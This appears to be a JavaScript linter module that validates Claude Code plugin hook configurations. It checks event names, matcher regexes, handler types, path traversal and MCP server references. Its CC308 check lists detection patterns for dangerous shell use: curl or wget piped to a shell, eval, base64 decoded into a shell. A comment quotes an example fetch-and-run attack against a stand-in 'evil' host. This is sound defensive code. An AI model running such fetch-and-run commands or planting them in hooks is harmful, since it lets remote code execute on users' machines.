import path from "node:path";

import { createFinding, createMetric } from "../core/schema.js";
import { pathExists, readText, toPosixPath } from "../lib/files.js";

const VALID_HOOK_EVENTS = new Set([
  "SessionStart",
  "Setup",
  "UserPromptSubmit",
  "UserPromptExpansion",
  "PreToolUse",
  "PermissionRequest",
  "PermissionDenied",
  "PostToolUse",
  "PostToolUseFailure",
  "PostToolBatch",
  "Notification",
  "SubagentStart",
  "SubagentStop",
  "TaskCreated",
  "TaskCompleted",
  "Stop",
  "StopFailure",
  "TeammateIdle",
  "InstructionsLoaded",
  "ConfigChange",
  "CwdChanged",
  "FileChanged",
  "WorktreeCreate",
  "WorktreeRemove",
  "PreCompact",
  "PostCompact",
  "Elicitation",
  "ElicitationResult",
  "SessionEnd",
]);

const TOOL_RELATED_EVENTS = new Set([
  "PreToolUse",
  "PostToolUse",
  "PostToolUseFailure",
  "PostToolBatch",
]);

const VALID_HOOK_TYPES = new Set(["command", "http", "mcp_tool", "prompt", "agent"]);

const SYSTEM_BIN_ALLOWLIST = new Set([
  "bash",
  "sh",
  "zsh",
  "node",
  "python",
  "python3",
  "npm",
  "npx",
  "git",
  "rg",
  "jq",
  "tail",
  "watch",
  "curl",
  "ping",
  "diff",
  "cat",
  "echo",
  "true",
  "false",
]);

function lcEqualsIgnoreCase(a, b) {
  return typeof a === "string" && typeof b === "string" && a.toLowerCase() === b.toLowerCase();
}

function caseWrongMatch(name) {
  if (typeof name !== "string") return null;
  for (const valid of VALID_HOOK_EVENTS) {
    if (valid !== name && lcEqualsIgnoreCase(valid, name)) return valid;
  }
  return null;
}

function asArray(value) {
  if (value == null) return [];
  if (Array.isArray(value)) return value;
  return [value];
}

function firstWord(command) {
  if (typeof command !== "string") return "";
  const trimmed = command.trim();
  if (!trimmed) return "";
  const parts = trimmed.split(/\s+/);
  return parts[0];
}

function stripQuotes(value) {
  if (typeof value !== "string") return value;
  return value.replace(/^["']|["']$/g, "");
}

function resolvePluginPath(pluginRoot, configuredPath) {
  const root = path.resolve(pluginRoot);
  const candidatePath = path.resolve(root, configuredPath.replace(/^\.\//, ""));
  const rel = path.relative(root, candidatePath);
  if (rel === ".." || rel.startsWith(`..${path.sep}`) || path.isAbsolute(rel)) {
    return {
      candidatePath,
      fileRel: toPosixPath(path.relative(root, candidatePath)),
      error: "Configured path must stay inside plugin root.",
    };
  }
  return { candidatePath, fileRel: toPosixPath(rel || ".") };
}

async function readHookConfigFile(pluginRoot, configuredPath) {
  const { candidatePath, fileRel, error } = resolvePluginPath(pluginRoot, configuredPath);
  if (error) {
    return { source: null, sourceFile: fileRel, parseError: error };
  }
  if (!(await pathExists(candidatePath))) {
    return { source: null, sourceFile: fileRel, parseError: null };
  }
  let raw;
  try {
    raw = await readText(candidatePath);
  } catch (error) {
    return {
      source: null,
      sourceFile: fileRel,
      parseError: error instanceof Error ? error.message : String(error),
    };
  }
  try {
    const parsed = JSON.parse(raw);
    // Some hooks files use top-level { hooks: { ... } }; unwrap if so.
    if (parsed && typeof parsed === "object" && parsed.hooks && typeof parsed.hooks === "object") {
      return { source: parsed.hooks, sourceFile: fileRel, parseError: null };
    }
    return { source: parsed, sourceFile: fileRel, parseError: null };
  } catch (error) {
    return {
      source: null,
      sourceFile: fileRel,
      parseError: error instanceof Error ? error.message : String(error),
    };
  }
}

async function loadHookConfig(pluginRoot, manifest) {
  // Returns { source: object|array|null, sourceFile: string, parseError: string|null }.
  if (manifest && typeof manifest.hooks === "object" && !Array.isArray(manifest.hooks)) {
    return { source: manifest.hooks, sourceFile: ".claude-plugin/plugin.json", parseError: null };
  }
  if (Array.isArray(manifest?.hooks)) {
    if (!manifest.hooks.every((entry) => typeof entry === "string")) {
      return { source: manifest.hooks, sourceFile: ".claude-plugin/plugin.json", parseError: null };
    }
    const sources = [];
    for (const hookPath of manifest.hooks) {
      const loaded = await readHookConfigFile(pluginRoot, hookPath);
      if (loaded.parseError) return loaded;
      if (loaded.source) sources.push(loaded.source);
    }
    return { source: sources.length > 0 ? sources : null, sourceFile: ".claude-plugin/plugin.json", parseError: null };
  }
  return readHookConfigFile(pluginRoot, typeof manifest?.hooks === "string" ? manifest.hooks : "hooks/hooks.json");
}

function addMcpServerNames(names, source) {
  const servers =
    source && typeof source === "object" && !Array.isArray(source) && source.mcpServers && typeof source.mcpServers === "object"
      ? source.mcpServers
      : source;
  if (servers && typeof servers === "object" && !Array.isArray(servers)) {
    for (const key of Object.keys(servers)) names.add(key);
  }
}

async function readMcpServerConfig(pluginRoot, configuredPath) {
  const { candidatePath } = resolvePluginPath(pluginRoot, configuredPath);
  if (!(await pathExists(candidatePath))) return null;
  try {
    return JSON.parse(await readText(candidatePath));
  } catch {
    return null;
  }
}

async function collectMcpServerNames(pluginRoot, manifest) {
  const names = new Set();
  if (manifest?.mcpServers && typeof manifest.mcpServers === "object" && !Array.isArray(manifest.mcpServers)) {
    addMcpServerNames(names, manifest.mcpServers);
  } else if (typeof manifest?.mcpServers === "string") {
    addMcpServerNames(names, await readMcpServerConfig(pluginRoot, manifest.mcpServers));
  } else if (Array.isArray(manifest?.mcpServers)) {
    for (const entry of manifest.mcpServers) {
      if (typeof entry === "string") {
        addMcpServerNames(names, await readMcpServerConfig(pluginRoot, entry));
      } else if (entry && typeof entry === "object" && !Array.isArray(entry)) {
        addMcpServerNames(names, entry);
      }
    }
  }
  return names;
}

export async function evaluateHooks(pluginRoot, manifest) {
  const findings = [];
  const metrics = [];
  const artifacts = [];

  const { source, sourceFile, parseError } = await loadHookConfig(pluginRoot, manifest);

  if (parseError) {
    findings.push(
      createFinding({
        severity: "error",
        code: "CC301",
        message: `Hook config does not parse as JSON: ${parseError}`,
        location: { file: sourceFile },
        fix: "Validate hooks.json with `node -e 'JSON.parse(require(\"fs\").readFileSync(...))'`.",
      }),
    );
    return { findings, metrics, artifacts };
  }

  if (!source) {
    return { findings, metrics, artifacts };
  }

  // The reference also allows hook configs to be arrays of hook configs (multi-source). Treat as a list.
  const eventBuckets = Array.isArray(source) ? source : [source];

  let totalHandlers = 0;
  let commandCount = 0;
  let httpCount = 0;
  let mcpToolCount = 0;
  let promptCount = 0;
  let agentCount = 0;
  const allEvents = new Set();
  const declaredMcpServers = await collectMcpServerNames(pluginRoot, manifest);

  for (const bucket of eventBuckets) {
    if (!bucket || typeof bucket !== "object" || Array.isArray(bucket)) {
      findings.push(
        createFinding({
          severity: "error",
          code: "CC301",
          message: "Hook config entry is not an object keyed by event name.",
          location: { file: sourceFile },
        }),
      );
      continue;
    }

    for (const [originalEventName, eventValue] of Object.entries(bucket)) {
      let eventName = originalEventName;
      if (!VALID_HOOK_EVENTS.has(eventName)) {
        const fixCase = caseWrongMatch(eventName);
        if (fixCase) {
          findings.push(
            createFinding({
              severity: "warn",
              code: "CC303",
              message: `Hook event "${eventName}" is cased wrongly; expected "${fixCase}".`,
              location: { file: sourceFile },
              fix: `Rename to "${fixCase}" (event names are case-sensitive).`,
            }),
          );
          // Use the canonical name for downstream checks (CC307, TOOL_RELATED_EVENTS).
          // Without this, the case-wrong event would slip past tool-event-specific guidance.
          eventName = fixCase;
        } else {
          findings.push(
            createFinding({
              severity: "error",
              code: "CC302",
              message: `Hook event "${eventName}" is not a recognized Claude Code event.`,
              location: { file: sourceFile },
              fix: "Use one of the events from the Claude Code hooks reference (case-sensitive).",
            }),
          );
          continue;
        }
      }
      allEvents.add(eventName);

      const matcherEntries = Array.isArray(eventValue) ? eventValue : [eventValue];
      for (const matcherEntry of matcherEntries) {
        if (!matcherEntry || typeof matcherEntry !== "object") continue;

        // CC307 — recommended matcher for tool-related events.
        if (TOOL_RELATED_EVENTS.has(eventName) && !matcherEntry.matcher) {
          findings.push(
            createFinding({
              severity: "info",
              code: "CC307",
              message: `Hook on "${eventName}" has no \`matcher\`; consider scoping to specific tools (e.g. "Write|Edit").`,
              location: { file: sourceFile },
              fix: "Add a `matcher` regex to limit which tool calls trigger the hook.",
            }),
          );
        }

        // Validate matcher regex if present. Also flag patterns with classic
        // catastrophic-backtracking shapes — `(a+)+`, nested-quantifier groups,
        // overly long expressions — since the pattern runs against every tool
        // call in production and a poison-regex would stall the harness.
        if (typeof matcherEntry.matcher === "string" && matcherEntry.matcher !== "") {
          try {
            new RegExp(matcherEntry.matcher);
            const looksRedos =
              matcherEntry.matcher.length > 200 ||
              /\([^)]{0,80}[+*][^)]{0,40}\)\s*[+*]/.test(matcherEntry.matcher) ||
              /\(\?:[^)]*\)[+*]\s*[+*]/.test(matcherEntry.matcher);
            if (looksRedos) {
              findings.push(
                createFinding({
                  severity: "warn",
                  code: "CC310",
                  message: `Hook \`matcher\` regex has a backtracking-prone shape: ${matcherEntry.matcher}.`,
                  location: { file: sourceFile },
                  fix: "Rewrite without nested quantifiers (e.g. (a+)+ → a+) and avoid runaway alternation.",
                }),
              );
            }
          } catch (error) {
            findings.push(
              createFinding({
                severity: "error",
                code: "CC302",
                message: `Hook \`matcher\` is not a valid regex: ${matcherEntry.matcher}.`,
                location: { file: sourceFile },
              }),
            );
          }
        }

        const handlerList = Array.isArray(matcherEntry.hooks) ? matcherEntry.hooks : [matcherEntry];
        for (const handler of handlerList) {
          if (!handler || typeof handler !== "object") continue;
          totalHandlers += 1;

          const hookType = handler.type;
          if (typeof hookType !== "string" || !VALID_HOOK_TYPES.has(hookType)) {
            findings.push(
              createFinding({
                severity: "error",
                code: "CC304",
                message: `Hook handler has invalid \`type\` "${hookType}". Valid: command, http, mcp_tool, prompt, agent.`,
                location: { file: sourceFile },
              }),
            );
            continue;
          }

          if (hookType === "command") commandCount += 1;
          else if (hookType === "http") httpCount += 1;
          else if (hookType === "mcp_tool") mcpToolCount += 1;
          else if (hookType === "prompt") promptCount += 1;
          else if (hookType === "agent") agentCount += 1;

          if (hookType === "command" && typeof handler.command === "string") {
            const command = handler.command;

            // CC900 — path traversal in command.
            const stripped = command.replace(/\$\{CLAUDE_PLUGIN_ROOT\}/g, "").replace(/\$\{CLAUDE_PLUGIN_DATA\}/g, "");
            if (/(?:^|\s|\/)\.\.\//.test(stripped)) {
              findings.push(
                createFinding({
                  severity: "error",
                  code: "CC900",
                  message: `Hook command contains \`../\` after stripping plugin variables: ${command}.`,
                  location: { file: sourceFile },
                  fix: "Reference scripts via ${CLAUDE_PLUGIN_ROOT}/...; external paths do not survive caching.",
                }),
              );
            }

            // CC305 — script via ${CLAUDE_PLUGIN_ROOT} missing on disk.
            const rootRefMatch = command.match(/\$\{CLAUDE_PLUGIN_ROOT\}([^\s"';|&<>]+)/);
            if (rootRefMatch) {
              const scriptRel = stripQuotes(rootRefMatch[1]).replace(/^\//, "");
              const scriptPath = path.join(pluginRoot, scriptRel);
              if (scriptRel && !(await pathExists(scriptPath))) {
                findings.push(
                  createFinding({
                    severity: "warn",
                    code: "CC305",
                    message: `Hook command references missing script: \${CLAUDE_PLUGIN_ROOT}/${scriptRel}.`,
                    location: { file: sourceFile },
                    fix: `Create ${scriptRel} or update the command path.`,
                  }),
                );
              }
            }

            // CC306 — command lacks plugin variables and is not a system bin.
            const usesPluginVar = /\$\{CLAUDE_PLUGIN_ROOT\}|\$\{CLAUDE_PLUGIN_DATA\}/.test(command);
            const head = firstWord(command);
            if (!usesPluginVar) {
              const cleanedHead = head.replace(/^["']/, "").replace(/["']$/, "");
              if (cleanedHead && !SYSTEM_BIN_ALLOWLIST.has(cleanedHead)) {
                findings.push(
                  createFinding({
                    severity: "warn",
                    code: "CC306",
                    message: `Hook command "${cleanedHead}" does not reference \${CLAUDE_PLUGIN_ROOT}; runtime CWD is unspecified.`,
                    location: { file: sourceFile },
                    fix: "Prefix scripts with ${CLAUDE_PLUGIN_ROOT}/ or use a system binary like bash/node/python.",
                  }),
                );
              }
            }

            // CC308 — command embeds unsafe shell patterns. The first-word allowlist
            // (CC306) only inspects the leading binary; an attacker-authored hook can
            // still smuggle dynamic execution past it via `bash -c "curl evil | sh"`,
            // `eval`, base64-into-shell, or redirects to absolute paths outside the
            // plugin tree.
            const unsafeShellPatterns = [
              {
                pattern: /\b(?:curl|wget|fetch|http)\b[^|;&]*[|]\s*(?:sh|bash|zsh|ksh|dash|fish|sudo)\b/i,
                summary: "pipes a network fetch directly into a shell",
              },
              { pattern: /(?:^|[\s;|&(`"'])eval\s+/i, summary: "invokes `eval` to execute dynamic strings" },
              { pattern: /(?:^|[\s;|&(`"'])exec\s+(?!["']?[/$])/i, summary: "invokes `exec` with a non-anchored target" },
              {
                pattern: /\bbase64\b[^|;]*[|]\s*(?:sh|bash|zsh|ksh|dash|fish)\b/i,
                summary: "decodes base64 into a shell interpreter",
              },
              {
                pattern: /(?:^|\s)(?:>>?|&>|2>)\s*(?:["']?\/(?!tmp\/cc-plugin-eval[\b/]))/,
                summary: "redirects output to an absolute path outside the plugin tree",
              },
            ];
            for (const { pattern, summary } of unsafeShellPatterns) {
              if (pattern.test(command)) {
                findings.push(
                  createFinding({
                    severity: "error",
                    code: "CC308",
                    message: `Hook command ${summary}: ${command}`,
                    location: { file: sourceFile },
                    fix: "Move the work into a script under ${CLAUDE_PLUGIN_ROOT}/ instead of dynamic shell evaluation.",
                  }),
                );
                break;
              }
            }
          }

          if (hookType === "prompt") {
            const promptText = typeof handler.prompt === "string" ? handler.prompt : "";
            if (promptText && !promptText.includes("$ARGUMENTS")) {
              findings.push(
                createFinding({
                  severity: "warn",
                  code: "CC309",
                  message: "Prompt-type hook does not reference $ARGUMENTS; the placeholder is the only way to inject event context.",
                  location: { file: sourceFile },
                  fix: "Include $ARGUMENTS in the `prompt` body where the event JSON should be injected.",
                }),
              );
            }
          }

          if (hookType === "mcp_tool") {
            // mcp_tool handlers identify the MCP server either via handler.server
            // or via the leading segment of handler.command ("<server>/<tool>").
            const fromCommand = typeof handler.command === "string" ? handler.command.split("/")[0] : "";
            const fromServer = typeof handler.server === "string" ? handler.server : "";
            const serverName = fromServer || fromCommand;
            if (serverName && !declaredMcpServers.has(serverName)) {
              findings.push(
                createFinding({
                  severity: "warn",
                  code: "CC310",
                  message: `Hook references MCP server "${serverName}" not declared in manifest.mcpServers.`,
                  location: { file: sourceFile },
                  fix: "Declare the server in manifest.mcpServers or .mcp.json before referencing it.",
                }),
              );
            }
          }
        }
      }
    }
  }

  metrics.push(
    createMetric({
      id: "hooks_event_count",
      category: "hooks",
      value: allEvents.size,
      unit: "events",
      band: "info",
    }),
    createMetric({
      id: "hooks_total_handler_count",
      category: "hooks",
      value: totalHandlers,
      unit: "handlers",
      band: "info",
    }),
    createMetric({ id: "hooks_command_count", category: "hooks", value: commandCount, unit: "handlers", band: "info" }),
    createMetric({ id: "hooks_http_count", category: "hooks", value: httpCount, unit: "handlers", band: "info" }),
    createMetric({ id: "hooks_mcp_tool_count", category: "hooks", value: mcpToolCount, unit: "handlers", band: "info" }),
    createMetric({ id: "hooks_prompt_count", category: "hooks", value: promptCount, unit: "handlers", band: "info" }),
    createMetric({ id: "hooks_agent_count", category: "hooks", value: agentCount, unit: "handlers", band: "info" }),
  );

  return { findings, metrics, artifacts };
}
